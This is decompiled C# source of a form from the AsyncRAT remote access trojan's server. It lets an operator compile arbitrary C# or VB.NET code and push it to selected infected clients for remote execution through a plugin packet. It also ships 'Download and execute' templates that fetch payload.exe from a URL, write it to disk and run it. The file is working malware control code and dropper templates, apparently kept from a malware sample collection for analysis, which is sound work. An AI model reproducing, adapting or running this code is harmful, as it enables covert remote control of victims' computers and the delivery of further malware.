// Decompiled with JetBrains decompiler
// Type: Server.Forms.FormDotNetEditor
// Assembly: AsyncRAT, Version=0.5.7.0, Culture=neutral, PublicKeyToken=null
// MVID: 51786A10-CF9D-455B-B8A4-B82CB9EDE322
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Alien.gen-bb1f2c2c9b279790b67eaea6ab0bbce3a4d4432bbe1bd716750f2f9ba3337f7e.exe

using FastColoredTextBoxNS;
using Microsoft.CSharp;
using Microsoft.VisualBasic;
using Server.Algorithm;
using Server.Connection;
using Server.MessagePack;
using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;

namespace Server.Forms
{
  public class FormDotNetEditor : Form
  {
    private Dictionary<string, string> providerOptions = new Dictionary<string, string>()
    {
      {
        "CompilerVersion",
        "v4.0"
      }
    };
    private IContainer components;
    private Panel panel1;
    private Label label3;
    private ComboBox comboHelper;
    private Label label2;
    private ListBox listBoxReferences;
    private Label label1;
    private ComboBox comboLang;
    private Panel panel2;
    private ContextMenuStrip menuReferences;
    private Button button2;
    private Button button1;
    private ToolStripMenuItem addToolStripMenuItem;
    private ToolStripMenuItem removeToolStripMenuItem;
    private Button button3;
    private FastColoredTextBox txtBox;
    private Panel panel3;

    public FormDotNetEditor() => this.InitializeComponent();

    private void FormDotNetEditor_Load(object sender, EventArgs e)
    {
      this.comboLang.SelectedIndex = 0;
      this.comboHelper.SelectedIndex = 1;
    }

    private void Button1_Click(object sender, EventArgs e)
    {
      if (this.listBoxReferences.Items.Count == 0 || string.IsNullOrWhiteSpace(((Control) this.txtBox).Text))
        return;
      if (!((Control) this.txtBox).Text.ToLower().Contains("try") && !((Control) this.txtBox).Text.ToLower().Contains("catch"))
      {
        int num1 = (int) MessageBox.Show("Please add try catch", "AsyncRAT | Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
      }
      if (Program.form1.listView1.SelectedItems.Count > 0)
      {
        List<string> values = new List<string>();
        foreach (string str in this.listBoxReferences.Items)
          values.Add(str);
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Packet").AsString = "executeDotNetCode";
        msgPack1.ForcePathObject("Option").AsString = this.comboLang.Text;
        msgPack1.ForcePathObject("Code").AsString = ((Control) this.txtBox).Text;
        msgPack1.ForcePathObject("Reference").AsString = string.Join(",", (IEnumerable<string>) values);
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Packet").AsString = "plugin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miscellaneous.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (ListViewItem selectedItem in Program.form1.listView1.SelectedItems)
          ThreadPool.QueueUserWorkItem(new WaitCallback(((Clients) selectedItem.Tag).Send), (object) msgPack2.Encode2Bytes());
        int num2 = (int) MessageBox.Show("Executed!", "AsyncRAT | Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
      }
      else
      {
        int num3 = (int) MessageBox.Show("Selected client = 0", "AsyncRAT | Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
      }
    }

    private void ComboLang_SelectedIndexChanged(object sender, EventArgs e)
    {
      if (this.comboLang.SelectedIndex == 0)
      {
        this.txtBox.Language = (Language) 1;
        ((Control) this.txtBox).Text = ((Control) this.txtBox).Text = this.GetCode(this.comboLang.Text, this.comboHelper.Text);
      }
      else
      {
        this.txtBox.Language = (Language) 2;
        ((Control) this.txtBox).Text = this.GetCode(this.comboLang.Text, this.comboHelper.Text);
      }
    }

    private void Button2_Click(object sender, EventArgs e) => this.txtBox.Clear();

    private void ComboHelper_SelectedIndexChanged(object sender, EventArgs e)
    {
      if (this.comboHelper.SelectedIndex == 0)
      {
        if (this.comboLang.SelectedIndex == 0)
          ((Control) this.txtBox).Text = ((Control) this.txtBox).Text = ((Control) this.txtBox).Text = this.GetCode(this.comboLang.Text, this.comboHelper.Text);
        else
          ((Control) this.txtBox).Text = ((Control) this.txtBox).Text = this.GetCode(this.comboLang.Text, this.comboHelper.Text);
      }
      if (this.comboHelper.SelectedIndex != 1)
        return;
      if (this.comboLang.SelectedIndex == 0)
        ((Control) this.txtBox).Text = ((Control) this.txtBox).Text = this.GetCode(this.comboLang.Text, this.comboHelper.Text);
      else
        ((Control) this.txtBox).Text = this.GetCode(this.comboLang.Text, this.comboHelper.Text);
    }

    private string GetCode(string lang, string code)
    {
      switch (lang)
      {
        case "C#":
          switch (code)
          {
            case "Hello world":
              return "using System;\r\nusing System.Windows.Forms;\r\nnamespace AsyncRAT\r\n{\r\n    public class Program\r\n    {\r\n        public static void Main(string[] args)\r\n        {\r\n            try\r\n            {\r\n                MessageBox.Show(\"Hello World\");\r\n            }\r\n            catch { }\r\n        }\r\n    }\r\n}";
            case "Download and execute":
              return "using System.Net;\r\nusing System.IO;\r\nusing System.Diagnostics;\r\n\r\nnamespace AsyncRAT\r\n{\r\n    public class Program\r\n    {\r\n        public static void Main()\r\n        {\r\n            try\r\n            {\r\n                using (WebClient wc = new WebClient())\r\n                {\r\n                    try\r\n                    {\r\n                        string name = Path.GetRandomFileName() + \".exe\";\r\n                        byte[] buffer = wc.DownloadData(\"http://127.0.0.1/payload.exe\");\r\n                        File.WriteAllBytes(name, buffer);\r\n                        Process.Start(name);\r\n                    }\r\n                    catch { }\r\n                }\r\n            }\r\n            catch { }\r\n        }\r\n    }\r\n}\r\n";
          }
          break;
        case "VB.NET":
          switch (code)
          {
            case "Hello world":
              return "Imports System\r\nImports System.Windows.Forms\r\n\r\nNamespace AsyncRAT\r\n    Public Class Program\r\n        Public Shared Sub Main(ByVal args As String())\r\n            Try\r\n                MessageBox.Show(\"Hello World\")\r\n            Catch\r\n            End Try\r\n        End Sub\r\n    End Class\r\nEnd Namespace\r\n\r\n";
            case "Download and execute":
              return "Imports System.Net\r\nImports System.IO\r\nImports System.Diagnostics\r\n\r\nNamespace AsyncRAT\r\n    Public Class Program\r\n        Public Shared Sub Main()\r\n            Try\r\n\r\n                Using wc As WebClient = New WebClient()\r\n\r\n                    Try\r\n                        Dim name As String = Path.GetRandomFileName() & \".exe\"\r\n                        Dim buffer As Byte() = wc.DownloadData(\"http://127.0.0.1/payload.exe\")\r\n                        File.WriteAllBytes(name, buffer)\r\n                        Process.Start(name)\r\n                    Catch\r\n                    End Try\r\n                End Using\r\n\r\n            Catch\r\n            End Try\r\n        End Sub\r\n    End Class\r\nEnd Namespace\r\n\r\n";
          }
          break;
      }
      return "";
    }

    private void RemoveToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.listBoxReferences.SelectedItems.Count != 1)
        return;
      this.listBoxReferences.Items.Remove(this.listBoxReferences.SelectedItem);
    }

    private void AddToolStripMenuItem_Click(object sender, EventArgs e)
    {
      string str1 = Interaction.InputBox("Add Reference", "References");
      if (string.IsNullOrEmpty(str1))
        return;
      foreach (string str2 in this.listBoxReferences.Items)
      {
        if (str2 == str1)
          return;
      }
      this.listBoxReferences.Items.Add((object) str1);
    }

    private void Button3_Click(object sender, EventArgs e)
    {
      if (this.listBoxReferences.Items.Count == 0 || string.IsNullOrWhiteSpace(((Control) this.txtBox).Text))
        return;
      if (!((Control) this.txtBox).Text.ToLower().Contains("try") && !((Control) this.txtBox).Text.ToLower().Contains("catch"))
      {
        int num = (int) MessageBox.Show("Please add try catch", "AsyncRAT | Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
      }
      List<string> values = new List<string>();
      foreach (string str in this.listBoxReferences.Items)
        values.Add(str);
      switch (this.comboLang.Text)
      {
        case "C#":
          this.Compiler((CodeDomProvider) new CSharpCodeProvider((IDictionary<string, string>) this.providerOptions), ((Control) this.txtBox).Text, string.Join(",", (IEnumerable<string>) values).Split(new string[1]
          {
            ","
          }, StringSplitOptions.RemoveEmptyEntries));
          break;
        case "VB.NET":
          this.Compiler((CodeDomProvider) new VBCodeProvider((IDictionary<string, string>) this.providerOptions), ((Control) this.txtBox).Text, string.Join(",", (IEnumerable<string>) values).Split(new string[1]
          {
            ","
          }, StringSplitOptions.RemoveEmptyEntries));
          break;
      }
    }

    private void Compiler(
      CodeDomProvider codeDomProvider,
      string source,
      string[] referencedAssemblies)
    {
      try
      {
        new Dictionary<string, string>()
        {
          {
            "CompilerVersion",
            "v4.0"
          }
        };
        string str = "/target:winexe /platform:anycpu /optimize-";
        CompilerParameters options = new CompilerParameters(referencedAssemblies)
        {
          GenerateExecutable = true,
          GenerateInMemory = true,
          CompilerOptions = str,
          TreatWarningsAsErrors = false,
          IncludeDebugInformation = false
        };
        CompilerResults compilerResults = codeDomProvider.CompileAssemblyFromSource(options, source);
        if (compilerResults.Errors.Count > 0)
        {
          IEnumerator enumerator = compilerResults.Errors.GetEnumerator();
          try
          {
            if (!enumerator.MoveNext())
              return;
            CompilerError current = (CompilerError) enumerator.Current;
            int num = (int) MessageBox.Show(string.Format("{0}\nLine: {1}", (object) current.ErrorText, (object) current.Line), "AsyncRAT | Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
          }
          finally
          {
            if (enumerator is IDisposable disposable)
              disposable.Dispose();
          }
        }
        else
        {
          int num1 = (int) MessageBox.Show("No Error!", "AsyncRAT | Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message, "AsyncRAT | Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
      }
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (FormDotNetEditor));
      this.panel1 = new Panel();
      this.button3 = new Button();
      this.button2 = new Button();
      this.button1 = new Button();
      this.label3 = new Label();
      this.comboHelper = new ComboBox();
      this.label2 = new Label();
      this.listBoxReferences = new ListBox();
      this.menuReferences = new ContextMenuStrip(this.components);
      this.addToolStripMenuItem = new ToolStripMenuItem();
      this.removeToolStripMenuItem = new ToolStripMenuItem();
      this.label1 = new Label();
      this.comboLang = new ComboBox();
      this.panel2 = new Panel();
      this.panel3 = new Panel();
      this.txtBox = new FastColoredTextBox();
      this.panel1.SuspendLayout();
      this.menuReferences.SuspendLayout();
      this.panel2.SuspendLayout();
      this.panel3.SuspendLayout();
      ((ISupportInitialize) this.txtBox).BeginInit();
      this.SuspendLayout();
      this.panel1.Controls.Add((Control) this.label3);
      this.panel1.Controls.Add((Control) this.comboHelper);
      this.panel1.Controls.Add((Control) this.label2);
      this.panel1.Controls.Add((Control) this.listBoxReferences);
      this.panel1.Controls.Add((Control) this.label1);
      this.panel1.Controls.Add((Control) this.comboLang);
      this.panel1.Dock = DockStyle.Right;
      this.panel1.Location = new Point(914, 0);
      this.panel1.Name = "panel1";
      this.panel1.Size = new Size(215, 633);
      this.panel1.TabIndex = 0;
      this.button3.Location = new Point(375, 6);
      this.button3.Name = "button3";
      this.button3.Size = new Size(95, 43);
      this.button3.TabIndex = 8;
      this.button3.Text = "Test";
      this.button3.UseVisualStyleBackColor = true;
      this.button3.Click += new EventHandler(this.Button3_Click);
      this.button2.Location = new Point(148, 6);
      this.button2.Name = "button2";
      this.button2.Size = new Size(95, 43);
      this.button2.TabIndex = 7;
      this.button2.Text = "Reset";
      this.button2.UseVisualStyleBackColor = true;
      this.button2.Click += new EventHandler(this.Button2_Click);
      this.button1.Location = new Point(606, 6);
      this.button1.Name = "button1";
      this.button1.Size = new Size(95, 43);
      this.button1.TabIndex = 6;
      this.button1.Text = "Execute";
      this.button1.UseVisualStyleBackColor = true;
      this.button1.Click += new EventHandler(this.Button1_Click);
      this.label3.AutoSize = true;
      this.label3.Location = new Point(4, 522);
      this.label3.Name = "label3";
      this.label3.Size = new Size(60, 20);
      this.label3.TabIndex = 5;
      this.label3.Text = "Helper:";
      this.comboHelper.DropDownStyle = ComboBoxStyle.DropDownList;
      this.comboHelper.FormattingEnabled = true;
      this.comboHelper.Items.AddRange(new object[2]
      {
        (object) "Download and execute",
        (object) "Hello world"
      });
      this.comboHelper.Location = new Point(8, 554);
      this.comboHelper.Name = "comboHelper";
      this.comboHelper.Size = new Size(195, 28);
      this.comboHelper.TabIndex = 4;
      this.comboHelper.SelectedIndexChanged += new EventHandler(this.ComboHelper_SelectedIndexChanged);
      this.label2.AutoSize = true;
      this.label2.Location = new Point(4, 96);
      this.label2.Name = "label2";
      this.label2.Size = new Size(96, 20);
      this.label2.TabIndex = 3;
      this.label2.Text = "References:";
      this.listBoxReferences.ContextMenuStrip = this.menuReferences;
      this.listBoxReferences.FormattingEnabled = true;
      this.listBoxReferences.ItemHeight = 20;
      this.listBoxReferences.Items.AddRange(new object[5]
      {
        (object) "System.dll",
        (object) "System.Windows.Forms.dll",
        (object) "Microsoft.VisualBasic.dll",
        (object) "System.Management.dll",
        (object) "System.Drawing.dll"
      });
      this.listBoxReferences.Location = new Point(8, 128);
      this.listBoxReferences.Name = "listBoxReferences";
      this.listBoxReferences.Size = new Size(195, 364);
      this.listBoxReferences.TabIndex = 2;
      this.menuReferences.ImageScalingSize = new Size(24, 24);
      this.menuReferences.Items.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.addToolStripMenuItem,
        (ToolStripItem) this.removeToolStripMenuItem
      });
      this.menuReferences.Name = "menuReferences";
      this.menuReferences.ShowImageMargin = false;
      this.menuReferences.Size = new Size(125, 68);
      this.addToolStripMenuItem.Name = "addToolStripMenuItem";
      this.addToolStripMenuItem.Size = new Size(124, 32);
      this.addToolStripMenuItem.Text = "Add";
      this.addToolStripMenuItem.Click += new EventHandler(this.AddToolStripMenuItem_Click);
      this.removeToolStripMenuItem.Name = "removeToolStripMenuItem";
      this.removeToolStripMenuItem.Size = new Size(124, 32);
      this.removeToolStripMenuItem.Text = "Remove";
      this.removeToolStripMenuItem.Click += new EventHandler(this.RemoveToolStripMenuItem_Click);
      this.label1.AutoSize = true;
      this.label1.Location = new Point(4, 12);
      this.label1.Name = "label1";
      this.label1.Size = new Size(85, 20);
      this.label1.TabIndex = 1;
      this.label1.Text = "Language:";
      this.comboLang.DropDownStyle = ComboBoxStyle.DropDownList;
      this.comboLang.FormattingEnabled = true;
      this.comboLang.Items.AddRange(new object[2]
      {
        (object) "C#",
        (object) "VB.NET"
      });
      this.comboLang.Location = new Point(8, 40);
      this.comboLang.Name = "comboLang";
      this.comboLang.Size = new Size(195, 28);
      this.comboLang.TabIndex = 0;
      this.comboLang.SelectedIndexChanged += new EventHandler(this.ComboLang_SelectedIndexChanged);
      this.panel2.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
      this.panel2.Controls.Add((Control) this.txtBox);
      this.panel2.Location = new Point(12, 12);
      this.panel2.Name = "panel2";
      this.panel2.Size = new Size(884, 554);
      this.panel2.TabIndex = 1;
      this.panel3.Controls.Add((Control) this.button1);
      this.panel3.Controls.Add((Control) this.button3);
      this.panel3.Controls.Add((Control) this.button2);
      this.panel3.Dock = DockStyle.Bottom;
      this.panel3.Location = new Point(0, 572);
      this.panel3.Name = "panel3";
      this.panel3.Size = new Size(914, 61);
      this.panel3.TabIndex = 1;
      this.txtBox.AutoCompleteBracketsList = new char[10]
      {
        '(',
        ')',
        '{',
        '}',
        '[',
        ']',
        '"',
        '"',
        '\'',
        '\''
      };
      this.txtBox.AutoIndentCharsPatterns = "\r\n^\\s*[\\w\\.]+(\\s\\w+)?\\s*(?<range>=)\\s*(?<range>[^;]+);\r\n^\\s*(case|default)\\s*[^:]*(?<range>:)\\s*(?<range>[^;]+);\r\n";
      this.txtBox.AutoScrollMinSize = new Size(599, 264);
      this.txtBox.BackBrush = (Brush) null;
      this.txtBox.BracketsHighlightStrategy = (BracketsHighlightStrategy) 1;
      this.txtBox.CharHeight = 22;
      this.txtBox.CharWidth = 12;
      ((Control) this.txtBox).Cursor = Cursors.IBeam;
      this.txtBox.DisabledColor = Color.FromArgb(100, 180, 180, 180);
      ((Control) this.txtBox).Dock = DockStyle.Fill;
      this.txtBox.IsReplaceMode = false;
      this.txtBox.Language = (Language) 1;
      this.txtBox.LeftBracket = '(';
      this.txtBox.LeftBracket2 = '{';
      ((Control) this.txtBox).Location = new Point(0, 0);
      ((Control) this.txtBox).Name = "txtBox";
      this.txtBox.Paddings = new Padding(0);
      this.txtBox.RightBracket = ')';
      this.txtBox.RightBracket2 = '}';
      this.txtBox.SelectionColor = Color.FromArgb(60, 0, 0, (int) byte.MaxValue);
      this.txtBox.ServiceColors = (ServiceColors) componentResourceManager.GetObject("txtBox.ServiceColors");
      ((Control) this.txtBox).Size = new Size(884, 554);
      ((Control) this.txtBox).TabIndex = 2;
      ((Control) this.txtBox).Text = componentResourceManager.GetString("txtBox.Text");
      this.txtBox.Zoom = 100;
      this.AutoScaleDimensions = new SizeF(9f, 20f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(1129, 633);
      this.Controls.Add((Control) this.panel3);
      this.Controls.Add((Control) this.panel2);
      this.Controls.Add((Control) this.panel1);
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Name = nameof (FormDotNetEditor);
      this.StartPosition = FormStartPosition.CenterParent;
      this.Text = "Dot Net Editor";
      this.Load += new EventHandler(this.FormDotNetEditor_Load);
      this.panel1.ResumeLayout(false);
      this.panel1.PerformLayout();
      this.menuReferences.ResumeLayout(false);
      this.panel2.ResumeLayout(false);
      this.panel3.ResumeLayout(false);
      ((ISupportInitialize) this.txtBox).EndInit();
      this.ResumeLayout(false);
    }
  }
}
